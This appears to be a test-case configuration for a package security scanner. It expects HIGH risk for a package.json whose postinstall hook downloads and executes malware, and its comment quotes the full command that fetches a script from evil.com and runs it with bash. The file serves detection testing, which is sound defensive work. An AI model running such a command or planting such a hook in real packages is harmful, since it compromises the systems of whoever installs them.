# Test Case Configuration

# Expected risks for this test case (HIGH, MEDIUM, LOW)
expected_risks:
  - HIGH

# Description of what this test case tests
description: "Should show HIGH risk - contains suspicious postinstall hooks that download and execute malware"

# Files in this test case with their expected analysis
files:
  - file: "package.json"
    risk_level: "HIGH"
    comment: "Contains malicious postinstall script: 'wget -O /tmp/malware.sh https://evil.com/malware && bash /tmp/malware.sh' - downloads and executes remote malware during installation."
    patterns_detected:
      - "suspicious_postinstall_hook"
      - "remote_code_execution"
      - "wget_download_malware"
    purpose: "Tests detection of malicious npm lifecycle scripts that compromise systems during package installation."